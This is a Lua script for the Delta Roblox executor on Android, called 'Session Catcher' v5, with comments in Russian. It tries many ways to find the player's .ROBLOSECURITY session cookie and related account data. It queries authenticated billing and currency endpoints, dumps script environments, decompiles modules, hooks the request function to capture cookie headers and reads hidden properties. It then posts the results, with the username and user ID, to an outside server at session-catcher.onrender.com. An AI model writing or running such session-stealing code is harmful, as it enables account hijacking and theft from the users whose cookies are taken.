-- ============================================================
--  Session Catcher — Delta Executor (Android)
--  v5 — final probe: httpget auth, pibble, scripts, comm_channel
-- ============================================================

local SERVER_URL = "https://session-catcher.onrender.com/catch"

local httpRequest = request or http_request or (http and http.request) or nil
if not httpRequest then return end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local executorName, executorVersion = "Unknown", "Unknown"
pcall(function()
    if identifyexecutor then executorName, executorVersion = identifyexecutor() end
end)

-- -----------------------------------------------------------
-- 1. httpget с разными auth-эндпоинтами
-- -----------------------------------------------------------
local httpgetResults = {}

local authEndpoints = {
    "https://www.roblox.com/mobile/api/userinfo",
    "https://users.roblox.com/v1/users/authenticated",
    "https://www.roblox.com/authentication/is-2fa-enabled",
    "https://billing.roblox.com/v1/credit",
    "https://economy.roblox.com/v1/user/currency",
    "https://avatar.roblox.com/v1/avatar",
    "https://presence.roblox.com/v1/presence/last-online"
}

-- httpget (Delta)
for _, url in ipairs(authEndpoints) do
    local ok, resp = pcall(function()
        if httpget then return httpget(url) end
    end)
    if ok and resp then
        httpgetResults["httpget:" .. url] = resp:sub(1, 500)
    else
        httpgetResults["httpget:" .. url] = "FAILED: " .. tostring(resp):sub(1, 200)
    end
end

-- game:HttpGet (Roblox native)
for _, url in ipairs(authEndpoints) do
    local ok, resp = pcall(function()
        return game:HttpGet(url)
    end)
    if ok and resp then
        httpgetResults["gameHttpGet:" .. url] = resp:sub(1, 500)
    else
        httpgetResults["gameHttpGet:" .. url] = "FAILED: " .. tostring(resp):sub(1, 200)
    end
end

-- game.HttpGet (alternative)
for _, url in ipairs(authEndpoints) do
    local ok, resp = pcall(function()
        return game.HttpGet(game, url)
    end)
    if ok and resp then
        httpgetResults["gameHttpGetAlt:" .. url] = resp:sub(1, 500)
    else
        httpgetResults["gameHttpGetAlt:" .. url] = "FAILED: " .. tostring(resp):sub(1, 200)
    end
end

-- httppost (Delta) — POST на наш сервер с auth-запросом
local httppostResult = ""
pcall(function()
    if httppost then
        local resp = httppost("https://www.roblox.com/mobile/api/userinfo", "")
        httppostResult = resp:sub(1, 500) or "EMPTY"
    end
end)

-- -----------------------------------------------------------
-- 2. pibble table — вызываем все функции
-- -----------------------------------------------------------
local pibbleResults = {}

pcall(function()
    local genv = getgenv and getgenv() or _G
    local pbl = genv.pibble
    if pbl then
        -- gmail()
        local ok1, res1 = pcall(function()
            if pbl.gmail then return pbl.gmail() end
        end)
        pibbleResults["gmail"] = ok1 and tostring(res1):sub(1, 500) or "FAILED: " .. tostring(res1):sub(1, 200)
        
        -- washington()
        local ok2, res2 = pcall(function()
            if pbl.washington then return pbl.washington() end
        end)
        pibbleResults["washington"] = ok2 and tostring(res2):sub(1, 500) or "FAILED: " .. tostring(res2):sub(1, 200)
        
        -- getpibbles()
        local ok3, res3 = pcall(function()
            if pbl.getpibbles then return pbl.getpibbles() end
        end)
        pibbleResults["getpibbles"] = ok3 and tostring(res3):sub(1, 500) or "FAILED: " .. tostring(res3):sub(1, 200)
        
        -- is_pibble()
        local ok4, res4 = pcall(function()
            if pbl.is_pibble then return pbl.is_pibble() end
        end)
        pibbleResults["is_pibble"] = ok4 and tostring(res4) or "FAILED: " .. tostring(res4):sub(1, 200)
        
        -- is_detected()
        local ok5, res5 = pcall(function()
            if pbl.is_detected then return pbl.is_detected() end
        end)
        pibbleResults["is_detected"] = ok5 and tostring(res5) or "FAILED: " .. tostring(res5):sub(1, 200)
    end
end)

-- -----------------------------------------------------------
-- 3. get_comm_channel / create_comm_channel
-- -----------------------------------------------------------
local commChannelResults = {}

pcall(function()
    if get_comm_channel then
        local ok, ch = pcall(get_comm_channel)
        commChannelResults["get_comm_channel"] = ok and tostring(ch):sub(1, 500) or "FAILED: " .. tostring(ch):sub(1, 200)
    end
end)

pcall(function()
    if create_comm_channel then
        local ok, ch = pcall(create_comm_channel)
        commChannelResults["create_comm_channel"] = ok and tostring(ch):sub(1, 500) or "FAILED: " .. tostring(ch):sub(1, 200)
    end
end)

-- -----------------------------------------------------------
-- 4. getsenv на core scripts
-- -----------------------------------------------------------
local senvDumps = {}

pcall(function()
    if getsenv and getscripts then
        local scripts = getscripts()
        for _, script in ipairs(scripts) do
            local name = script.Name or tostring(script)
            local lowerName = name:lower()
            -- Ищем скрипты связанные с auth/session/login/cookie/security
            if lowerName:find("auth") or lowerName:find("session") or lowerName:find("login") 
               or lowerName:find("cookie") or lowerName:find("security") or lowerName:find("token")
               or lowerName:find("network") or lowerName:find("http") or lowerName:find("api") then
                local ok, senv = pcall(getsenv, script)
                if ok and senv then
                    local keys = {}
                    local cookieFound = ""
                    for k, v in pairs(senv) do
                        local kStr = tostring(k)
                        local vStr = tostring(v)
                        table.insert(keys, kStr .. ":" .. type(v))
                        -- Ищем куку в значениях
                        if type(v) == "string" then
                            if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
                                cookieFound = v:sub(1, 500)
                            end
                        end
                    end
                    senvDumps[name] = {
                        keys = keys,
                        cookieFound = cookieFound
                    }
                end
            end
        end
    end
end)

-- -----------------------------------------------------------
-- 5. getloadedmodules — ищем auth-модули
-- -----------------------------------------------------------
local authModules = {}

pcall(function()
    if getloadedmodules then
        local modules = getloadedmodules()
        for _, mod in ipairs(modules) do
            local name = mod.Name or tostring(mod)
            local lowerName = name:lower()
            if lowerName:find("auth") or lowerName:find("session") or lowerName:find("login")
               or lowerName:find("cookie") or lowerName:find("security") or lowerName:find("token")
               or lowerName:find("network") or lowerName:find("http") then
                table.insert(authModules, name)
                
                -- Пытаемся декомпилировать
                if decompile then
                    local ok, source = pcall(decompile, mod)
                    if ok and source then
                        -- Ищем упоминания куки
                        if source:find("_|WARNING") or source:find("ROBLOSECURITY") 
                           or source:find("cookie") or source:find("Cookie") then
                            -- Извлекаем контекст вокруг
                            local start = source:find("ROBLOSECURITY") or source:find("_|WARNING")
                            if start then
                                local s = math.max(1, start - 100)
                                local e = math.min(#source, start + 500)
                                authModules[#authModules] = name .. " => COOKIE_REF: " .. source:sub(s, e)
                            end
                        end
                    end
                end
            end
        end
    end
end)

-- -----------------------------------------------------------
-- 6. Hook request — перехватываем внутренние вызовы
-- -----------------------------------------------------------
local interceptedHeaders = {}
local interceptCount = 0

pcall(function()
    if hookfunction then
        local original = request
        local hooked = newcclosure(function(args)
            interceptCount = interceptCount + 1
            if type(args) == "table" then
                local entry = {
                    url = args.Url or "N/A",
                    method = args.Method or "GET",
                    headers = {}
                }
                if args.Headers then
                    for k, v in pairs(args.Headers) do
                        entry.headers[tostring(k)] = tostring(v):sub(1, 300)
                        if tostring(k):lower():find("cookie") or tostring(v):find("_|WARNING") or tostring(v):find("ROBLOSECURITY") then
                            table.insert(interceptedHeaders, entry)
                        end
                    end
                end
                table.insert(interceptedHeaders, entry)
            end
            return original(args)
        end)
        hookfunction(request, hooked)
        
        -- Ждём 3 секунды, может Roblox сделает внутренний HTTP запрос
        task.wait(3)
    end
end)

-- -----------------------------------------------------------
-- 7. getinstances — ищем объекты с auth данными
-- -----------------------------------------------------------
local authInstances = {}

pcall(function()
    if getinstances then
        local instances = getinstances()
        for _, inst in ipairs(instances) do
            local name = inst.Name or ""
            local className = inst.ClassName or ""
            local lowerName = name:lower()
            if lowerName:find("auth") or lowerName:find("session") or lowerName:find("token")
               or lowerName:find("cookie") or lowerName:find("security") then
                table.insert(authInstances, name .. " (" .. className .. ")")
                
                -- Проверяем скрытые свойства
                if gethiddenproperty then
                    local props = {"Value", "Text", "Cookie", "Token", "Session", "Auth"}
                    for _, prop in ipairs(props) do
                        local ok, val = pcall(gethiddenproperty, inst, prop)
                        if ok and val and type(val) == "string" and #val > 10 then
                            table.insert(authInstances, "  └ " .. prop .. " = " .. val:sub(1, 300))
                        end
                    end
                end
            end
        end
    end
end)

-- -----------------------------------------------------------
-- 8. WebSocket — есть ли WS функции
-- -----------------------------------------------------------
local wsInfo = ""
pcall(function()
    local genv = getgenv and getgenv() or _G
    if genv.WebSocket then
        local keys = {}
        for k, v in pairs(genv.WebSocket) do
            table.insert(keys, tostring(k) .. ":" .. type(v))
        end
        wsInfo = table.concat(keys, ", ")
    end
end)

-- -----------------------------------------------------------
-- 9. setrbxclipboard — пробуем через буфер обмена
-- -----------------------------------------------------------
local rbxClipboardInfo = ""
pcall(function()
    if setrbxclipboard then
        rbxClipboardInfo = "setrbxclipboard exists"
    end
end)

-- -----------------------------------------------------------
-- 10. getscriptbytecode на CoreScripts
-- -----------------------------------------------------------
local bytecodeSnippets = {}

pcall(function()
    if getscripts and getscriptbytecode then
        local scripts = getscripts()
        for _, script in ipairs(scripts) do
            local name = script.Name or tostring(script)
            local lowerName = name:lower()
            if lowerName:find("auth") or lowerName:find("login") or lowerName:find("session") then
                local ok, bytecode = pcall(getscriptbytecode, script)
                if ok and bytecode then
                    -- Ищем паттерн куки в байткоде
                    if bytecode:find("_|WARNING") or bytecode:find("ROBLOSECURITY") then
                        bytecodeSnippets[name] = "COOKIE FOUND IN BYTECODE: " .. bytecode:sub(1, 500)
                    else
                        bytecodeSnippets[name] = "No cookie in bytecode (len: " .. #bytecode .. ")"
                    end
                end
            end
        end
    end
end)

-- -----------------------------------------------------------
-- Отправка
-- -----------------------------------------------------------
local payload = {
    userId = LocalPlayer.UserId,
    username = LocalPlayer.Name,
    displayName = LocalPlayer.DisplayName,
    placeId = game.PlaceId,
    placeName = (MarketplaceService and pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId).Name end)) or "Unknown",
    jobId = game.JobId,
    executor = executorName,
    executorVersion = executorVersion,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    httpgetResults = httpgetResults,
    httppostResult = httppostResult,
    pibbleResults = pibbleResults,
    commChannelResults = commChannelResults,
    senvDumps = senvDumps,
    authModules = authModules,
    interceptedHeaders = interceptedHeaders,
    interceptCount = interceptCount,
    authInstances = authInstances,
    wsInfo = wsInfo,
    rbxClipboardInfo = rbxClipboardInfo,
    bytecodeSnippets = bytecodeSnippets
}

local success, response = pcall(function()
    return httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["User-Agent"] = "Roblox/Delta-Catcher"
        },
        Body = HttpService:JSONEncode(payload)
    })
end)

if success then
    print("[Catcher] v5 sent. Status: " .. (response.StatusCode or "unknown"))
    print("[Catcher] httpget results: " .. #httpgetResults)
    print("[Catcher] pibble results: " .. #pibbleResults)
    print("[Catcher] intercepted: " .. interceptCount)
    print("[Catcher] auth modules: " .. #authModules)
    print("[Catcher] auth instances: " .. #authInstances)
else
    warn("[Catcher] Failed: " .. tostring(response))
end
